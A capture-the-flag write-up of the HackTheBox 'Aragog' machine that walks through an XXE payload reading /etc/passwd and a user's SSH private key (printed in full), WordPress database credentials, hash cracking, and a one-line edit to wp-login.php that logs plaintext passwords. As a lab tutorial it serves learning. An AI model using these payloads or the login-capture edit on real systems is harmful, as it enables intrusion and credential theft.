# HackTheBox Aragog Write Up
## Enumeration
As always, our first step will be enumerating the target to determine what services it is running.  -A tells nmap to do OS and version detection and traceroute so we can enumerate the services on the target.  -Pn tells nmap not to ping the target first.
```bash
nmap -A -Pn 10.10.10.78
```

```
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 19:51 EDT
Nmap scan report for 10.10.10.78
Host is up (0.029s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=7/8%OT=21%CT=1%CU=37849%PV=Y%DS=2%DC=T%G=Y%TM=5B42A381
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   30.94 ms 10.10.14.1
2   30.99 ms 10.10.10.78

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.48 seconds
```
There are some interesting results in this port scan.  We have an open FTP server.  Let's see if there are any files we can get from it:

```bash
ftp 10.10.10.78
ls

# There was a file called test.txt, so let's grab it.
get test.txt
```

Let's take a look at the file we grabbed:
```bash
cat test.txt
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```
This looks more like XML than a text file as its extension would have us believe.  This might be useful later, so we will hang onto it and explore other things.

## Getting the User Flag

Visiting the IP on port 80 to access the HTTP server running there did not yield anything directly, so we will use dirbuster to see if we can find other files.

After a few minutes, we see that dirbuster has found a file called hosts.php:
![Dirbuster Results](screenshots/1_dirbuster.PNG)

Let's try visiting the page and seeing what is there:
![hosts.php](screenshots/2_hosts.php.PNG)

There is not much here except for a message "There are 4294967294 possible hosts for".  4,294,967,294 = 2<sup>32</sup>.  IPv4 addresses are 32-bits, and since the text on the page mentions hosts, this script might have something to do with IP addresses.  If we recall test.txt that we saw before, it had a subnet mask field.  Perhaps hosts.php will calculate the number of hosts for you given a subnet mask.  There does not appear to be a GET parameter (like subnet_mask=) after the URL.  Maybe the page takes input via POST.  Even though there is no obvious form on the page, forms are not the only way for a page to accept data.  We can use curl to try sending the contents of test.txt to the server.  If that works, then we may be able to use the XML to exploit some vulnerability in hosts.php or something related.

```bash
# -X POST tells curl to use HTTP POST to send data to the server
# -d @test.txt tells curl to send the contents of text.txt to the server

curl -X POST -d @test.txt "http://10.10.10.78/hosts.php"
```
```bash
root@kali:~/ctf/hackthebox/aragog# curl -X POST -d @test.txt "http://10.10.10.78/hosts.php"

There are 62 possible hosts for 255.255.255.192
```
It looks like it is reading the XML because 255.255.255.192 was the subnet mask specified in test.txt.  That might be our way in.  I realize you may be reading this and thinking we are taking a lot of leaps.  Before I tried the POST trick, I spent a lot of time trying to figure out what this page did.  In real life, there would probably not be one page to try or the entry point for sending data may be much more complicated.  I think the point of these challenges is to add new tools to one's toolbox.  They are not meant to represent real life.

This challenge is an example of this for me.  Before I did this challenge, I did another challenge that had an XML vulnerability, so when I saw XML, I wanted to give that technique a try. In the latest edition of the OWASP Top 10 (2017), one of the vulnerabilities (A4) is related to how some XML parsers parse external entities, or XML eXternal Entities (XXE).  Essentially, a weakly configured XML processor sees a reference to an external resource (a file on the file system or a link to an external web site) and follows it blindly.  This can lead to disclosure of data on the file system on the server or data on other internal servers that the vulnerable server can see.  You can read more about XXE here<sup>[1]</sup> and its entry in the OWASP Top 10 here<sup>[2]</sup>.

We can craft XML to attempt to exploit an XXE vulnerability to read the contents of /etc/passwd.  I added some comments so we can see what is going on.
```xml
<!--
    !DOCTYPE starts the document type declaration.  Normally, this is used to define a list of permitted elements and attributes (a grammar, or set of rules) in the document's structure.
    Document Type Declarations (DTDs) are the predecessor to XML namespaces.

    In this example, we define a DTD for subnet_mask since we know that hosts.php makes use of that element.  We are telling the XML parser that the subnet_mask element is of any type.
    We are also telling the XML parser that the subnet_mask element has a subelement called xxe that is an alias for /etc/passwd.
-->
<!DOCTYPE subnet_mask [
<!ELEMENT subnet_mask ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<!--
    The rest of the document models the test.txt we sent to the server before.  Instead of a legitimate subnet mask,
    we will specify a reference for the xxe sub-element we defined above.  We reference entities / sub-elements by putting
    an ampresand in front of its name and a semi-colon after its name.  This is similar to C / C++.

    For the test element, it does not seem to matter what we put in there.
-->
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test>abcd</test>
</details>
```

I named the file test_xxe.xml.  We will send it to hosts.php in the same way we sent test.txt:
```bash
root@kali:~/ctf/hackthebox/aragog# curl -X POST -d @test_xxe.xml "http://10.10.10.78/hosts.php"

There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false
```
Looks like it worked.  We see that there are two users that can login other than root: florian and cliff since they have shells that are not nologin or /bin/false.

Let's poke around for files that should be in a user's home directory when they are running bash, like .bash_history.  For each example, we will modify our test_xxe.xml with the path to the file instead of /etc/passwd.  I decided to start with files in home directories because those are quick wins if we can access them.  In practice, files in users' home directories should not be readable by other users.  If we can read a user's files, the service is running as that user or as root.  It is also possible that the user misconfigured permissions in his home directory.

We can read florian's bash history:
```bash
groups
cat /etc/passwd
su root
sudo -l
cat /etc/groups
cat /etc/group
grep "lxd" /etc/group
grep "cliff" /etc/group
grep "lxd" /etc/group
init 0
su root
```
When I tried to read cliff's .bash_history, it did not work.  This means that the service is running as florian, root, or this file is open to the world.  We can see that florian may be able to escalate privileges to root using sudo or by knowing root's password and using su.  With our technique, all we can do is read files from the file system.  Since the box has SSH open, it is possible that florian has an SSH key we can read.  SSH keys are typically made by running the ```ssh-keygen``` command.  By default, ssh-keygen places SSH keys in /home/<user>/.ssh/id_rsa (private key) and id_rsa.pub (public key).  Let's see if we can find florian's private key (it may be under /home/florian/.ssh/id_rsa).  I modified the xxe entity in test_xxe.xml to point to /home/florian/.ssh/id_rsa.

```bash
root@kali:~/ctf/hackthebox/aragog# curl -X POST -d @test_xxe.xml "http://10.10.10.78/hosts.php"

There are 4294967294 possible hosts for -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
-----END RSA PRIVATE KEY-----
```
Looks like we have his private key, and it is unencrypted.  If it were encrypted, it would say BEGIN and END ENCRYPTED RSA PRIVATE KEY.  Let's try using it:
```bash
ssh -i florian_private_key florian@10.10.10.78
```

![SSH as florian](screenshots/3_florian_ssh.PNG)

Looks like it worked.  There are several interesting files and directories in here.  I usually look through places like Desktop and Documents because that is where people typically store files they are working on.

Before we move on, let's get the user flag:
```bash
cat user.txt
f43bdfbcfd3f2a955a7b67c7a6e21359
```

## Privilege Escalation and Getting the Root Flag
One of the interesting files in florian's home directory is .mysql_history.  This file is similar to .bash_history.  .bash_history is a record of all of the commands you type at the bash command line, and .mysql_history is a record of all of the commands you type on the MySQL command line.  .mysql_history will give us an idea of what databases the user of the system was interacting with.  Let's take a look at it:
```bash
less /home/florian/.mysql_history
```
![MySQL History](screenshots/4_mysql_history.PNG)

There are a few interesting artifacts in this file:

  * References to wp_options.  That is a database used in WordPress, so there may be an installation of WordPress on this box.
  * A URL: http://aragog/dev_wiki.  This could be where the site is hosted.

I want to see if this really is a WordPress installation since we may be able to recover additional credentials or information from it.  Before we dive into the database itself, we may be able to find database credentials from the WordPress installation, so we will start there.

From our nmap scan, it is likely that Apache is installed on this machine.  By default, Apache file are usually in /var/www/html.  If not, we can find the Apache configuration and find where the files are hosted.

Under /var/www/html, there is a folder called dev_wiki.  This corresponds to the dev_wiki reference we saw in the MySQL history file.  Here is the contents of the dev_wiki folder:
![dev_wiki Directory Listing](screenshots/5_dev_wiki_dir_list.PNG)

This looks like a WordPress installation.  It looks like the permissions are set very liberally (777).  In case you are unfamiliar with permissions in a *nix environment, they are typically expressed as a three digit number.  Each digit corresponds to an entity that would interact with the file.  In order from left to right, those entities are owner of the file or directory, the group assigned to the file or directory, and everyone else (sometimes called world).  The three common permissions on a file or directory are read, write, and execute.  Each of these permissions is assigned a number. Read is assigned 4, Write is assigned 2, and Execute is assigned 1.  You can add up these numbers to define the permissions for an entity (owner, group, and world).  A 7 means that the entity can read, write, and execute the file (4 + 2 + 1 = 7).  Permissions of 777 allow any user on the system complete control over the file or directory.  Typically, on a web server, the permissions to use are 755 (full control to the owner, and everyone else can read and execute).  Execute is needed for any directories that you might want to allow others to access.  777 is too permissive.

In a WordPress installation, database credentials are typically stored in wp-config.php. Let's take a look:
```bash
less /var/www/html/dev_wiki/wp-config.php
```
![wp-config.php](screenshots/6_dev_wiki_configphp.PNG)

Looks like we found the root database credentials for the database instance on this server (```root / $@y6CHJ^$#5c37j$#6h```).  It is likely these credentials correspond to the MySQL database we found earlier.  I tried to use these to log in as root using su, but they did not work unfortunately.  However, these credentials should allow us to login to the database:

```bash
# If we do not specify a server, mysql assumes we want to connect to localhost.
florian@aragog:~$ mysql -u root
```

We were able to get in.  WordPress credentials are stored in the wp_users table of the database.  We know from wp-config.php that the database we want is wp_wiki.  Let's get the the user credentials:
```sql
show databases;

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wp_wiki            |
+--------------------+
5 rows in set (0.02 sec)

mysql> use wp_wiki;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wp_wiki     |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_users;
+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+
| ID | user_login    | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name  |
+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+
|  1 | Administrator | $P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu. | administrator | it@megacorp.com |          | 2017-12-20 23:26:04 |                     |           0 | Administrator |
+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+
1 row in set (0.00 sec)
```

The $P$ in front of the hash ($P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu.) indicates that the password was hashed using PHPass.  Fortunately, John The Ripper can work against PHPass hashes.  We just need to put it in the format that John understands.  We need to make a file that looks like this:
```
<user>:<password hash>
```
John will know that this is a PHPass hash because of its format.

So for our example, we will create a file that looks like this:
```
Administrator:$P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu.
```

We will get John started then poke around the box some more.  The command I used was:
```bash
# I am going to use the rockyou wordlist against this hash.  On my Kali box, rockyou is in /usr/share/wordlists/rockyou.txt
# aragog_wp_admin.txt is the file with the Administrator hash in it
john --wordlist=/usr/share/wordlists/rockyou.txt aragog_wp_admin.txt
```

While that is going, let's take a look at the site itself.  Perhaps there is something on there that might provide some clues.

When we surf to http://10.10.10.78/dev_wiki, we get redirected to http://aragog/dev_wiki.  The easiest way to get around this is to edit /etc/hosts on our Kali box to point aragog to 10.10.10.78. /etc/hosts will work on any Linux box.  On Windows, you will need to edit ```C:\Windows\System32\drivers\etc\hosts```.  You will need to put in a line that looks like this:
```
10.10.10.78 aragog
```

Once we do that, we can see the site:
![dev_wiki Homepage](screenshots/7_dev_wiki_homepage.PNG)

After poking around a bit, I came across what appears to be the only post on the site:

![dev_wiki Post](screenshots/8_dev_wiki_post.PNG)

Here is the text of the post:
```
Welcome!

Hi Florian,

Thought we could use a wiki.  Feel free to log in and have a poke around – but as I’m messing about with a lot of changes I’ll probably be restoring the site from backup fairly frequently!

I’ll be logging in regularly and will email the wider team when I need some more testers 😉
```

It says he will be logging in regularly, so maybe we can capture his password somehow since we have write access to the WordPress site.  Login functions for WordPress are handled in the wp-login.php file.

Let's take a look at wp-login.php (where logins are handled).  I downloaded a copy to my machine using scp:
```bash
scp -i florian_private_key florian@10.10.10.78:/var/www/html/dev_wiki/wp-login.php .
```

If you read through the file, there is a switch statement that controls what happens when specific actions are performed.  One of the actions is called login.  When a user logs in, their password is hashed and the hash is compared to the password hash in the database.  If the hashes match, the user is authenticated.  So if we can dump the contents of the POST request before the hashing happens, we should be able to see the password in plain text.  In PHP, the contents of the POST request are stored in a variable called ```$_POST```.  We can write that to a file using ```put_file_contents```<sup>[3]</sup>.  Around line 848, we can insert the following line:
```php
file_put_contents('/tmp/login.txt', $_POST);
```

This line will write the contents of $_POST to /tmp/login.txt when the login action is triggered.

Here is what that section of the file looks like after the edit:
![file_put_contents in wp-login.php](screenshots/9_editing_wp_login.php.PNG)

We will replace the file on the server:
```bash
scp -i florian_private_key wp-login.php florian@10.10.10.78:/var/www/html/dev_wiki/wp-login.php
```

After a minute or so, let's look at the contents of /tmp on the server:
![/tmp on aragog](screenshots/10_contents_of_tmp.PNG)

Looks like it wrote something in the file.  Let's take a look:
![Contents of login.txt](screenshots/11_contents_of_login_txt.PNG)

Log In is the action, so the password is likely everything before that since the other fields do not look like a password.
```
!KRgYs(JFO!&MTr)lfLog In1Administratorhttp://127.0.0.1/dev_wiki/wp-admin/
^^^^^^^^^^^^^^^^^^|^^^^^|^^^^^^^^^^^^|^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    Password      | act |  username  | where to redirect if successful
```

So the password is ```!KRgYs(JFO!&MTr)lf```.  Let's try to login with it and see if it works.

Looks like it did.  This is the administrator panel in WordPress:
![dev_wiki Admin Panel](screenshots/12_wp_admin_dashboard.PNG)

I am not sure that this helps us though.  I poked aorund looking for anything that might help us escalate, but I did not find anything.  When I find a password like this, I try it against accounts I am trying to get into.  I think either cliff or root would be helpful in this case.  I tried to su as cliff from the access I had with florian, and it did not work.  Then I tried to su as root:
```bash
florian@aragog:~$ su -
```

![root on aragog](screenshots/13_login_as_root.PNG)

Success!  Reuse of passwords can be very helpful when you are trying to leap across to other applications or accounts.

Root flag:
```
9a9da52d7aad358699a96a5754595de6
```

# Conclusion
This was an interesting challenge because we had to really dive into the guts of WordPress to escalate privileges.  Playing around with XXE was also a good way to reinforce the idea that you cannot trust anything the user provides to you.  Even with the XXE vulnerability, correct file permissions would have gone a long way to making this much more difficult to pull off.  Incorrect file permissions allowed us to gain florian's SSH key which allowed us easy shell acess to the box.  With the permissions on the dev_wiki site set the way they were, we were able to create a very ugly method for capturing credentials of anyone logging in.  Combined with password reuse, we were able to completely take over the box.

# References
[1]: https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing "XML External Entity (XXE) Processing"
[2]: https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE) "Top 10-2017 A4-XML External Entities (XXE)"
[3]: http://php.net/manual/en/function.file-put-contents.php "PHP function file_put_contents"

  * [<sup>1</sup> XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
  * [<sup>2</sup> Top 10-2017 A4-XML External Entities (XXE)](https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE))
  * [<sup>3</sup> PHP function file_put_contents](http://php.net/manual/en/function.file-put-contents.php)
